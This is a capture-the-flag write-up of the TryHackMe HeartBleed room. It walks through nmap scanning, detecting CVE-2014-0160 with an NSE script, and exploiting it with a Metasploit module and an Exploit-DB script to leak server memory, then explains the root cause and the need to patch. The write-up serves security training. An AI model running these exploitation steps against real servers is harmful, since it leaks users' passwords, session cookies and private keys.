// Overview

HeartBleed is a TryHackMe room that demonstrates the infamous OpenSSL vulnerability (CVE-2014-0160). The objective is to exploit a vulnerable HTTPS server and retrieve the flag from its memory. The room demonstrates how one programming error in a commonly used library can lead to sensitive data from server memory being exposed, such as passwords, session cookies, and private keys.

View room on TryHackMe →

Flags and sensitive data have been redacted per TryHackMe's write-up policy.

// Reconnaissance

Port Scanning

We start with a comprehensive nmap scan to identify open ports and services:

$ nmap -sC -sV -p- <target_ip>

Two ports catch our attention:

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.4
443/tcp   open  ssl/http nginx 1.15.7

The SSL certificate provides additional context:

| ssl-cert: Subject: commonName=localhost/organizationName=TryHackMe/stateOrProvinceName=London/countryName=UK
| Not valid before: 2019-02-16T10:41:14
|_Not valid after:  2020-02-16T10:41:14

Vulnerability Detection

The fact that the certificate dates 2019-2020 indicates that the server could be running an older, vulnerable version of OpenSSL. We can check this using by using Nmap's Heartbleed detection script:

$ nmap -sV --script=ssl-heartbleed -p 443 <target_ip>

| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases are affected.
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|       http://www.openssl.org/news/secadv_20140407.txt
Pro tip: The --script=ssl-heartbleed flag is very useful for quickly verifying a vulnerability. It's always a good idea to check your results using multiple tools when you can.

// Exploitation

Metasploit Approach

While there are standalone Python scripts available, Metasploit provides a clean, reliable interface for exploiting Heartbleed:

$ msfconsole
msf6 > use auxiliary/scanner/ssl/openssl_heartbleed
msf6 > set RHOSTS <target_ip>
msf6 > set RPORT 443
msf6 > set VERBOSE true
msf6 > run

The VERBOSE setting is crucial, as it displays the leaked data in readable format:

[*] 10.80.71.102:443 - Heartbeat response, 65535 bytes
[+] 10.80.71.102:443 - Heartbeat response with leak, 65535 bytes
[*] 10.80.71.102:443 - Printable info leaked:
......user_name=hacker101&user_email=haxor@haxor.com&user_message=[FLAG_REDACTED]../..?.

What's Happening Here?

The Heartbleed exploit works by sending a malformed heartbeat request to the server:

  1. The client sends a heartbeat payload claiming to be 65,535 bytes long
  2. The vulnerable server allocates memory for this response
  3. Due to a missing bounds check, the server copies more data than it should from memory
  4. This leaks whatever data happens to be in memory at that moment

The leaked memory that was leaked included HTTP POST data which seems to come from a contact form submission. The flag was placed in the user_message field.

Alternative: Standalone Python Script

In environments without Metasploit, the Exploit-DB script (32764.py) can be used as an alternative:

$ searchsploit -m 32764.py
$ python3 32764.py <target_ip>

The script carries out the same memory leak attack and shows chunks of server memory, although a number of runs might be required since the leaked data is to some extent random.

// The Flag

The flag was extracted directly from the memory leak:

Flag flag{sSL...}

This was found in the HTTP POST data:

user_name=hacker101&user_email=haxor@haxor.com&user_message=[FLAG_REDACTED]

This shows that user-submitted data can be made accessible through memory leaks, even if the data was submitted at a different time.

// Key Takeaways

Always verify vulnerabilities before exploiting them. The Nmap script had confirmed that the vulnerability actually existed, which saved time and established the attack vector. This step is essential when carrying out responsible penetration testing.
Memory leaks are unpredictable. Different instances of the same exploit can produce different data. Therefore, run memory-leak exploits several times and carefully examine the output for any useful information.
Understand the underlying vulnerability. Heartbleed is possible due to the absence of a bounds check in OpenSSL's heartbeat implementation. Understanding the root cause helps in detecting other similar vulnerabilities and giving explanations to stakeholders.
Old software versions are dangerous. The server was using a version of OpenSSL that was prior to the Heartbleed patch in 2014. Regular patching and updating is essential for maintaining security.
Data in memory is vulnerable. Even if the data is encrypted in transit or at rest, it can still be accessed while in active memory. This is why Heartbleed was so dangerous; it had the potential to expose private keys, session cookies, and other sensitive data that should have been protected.
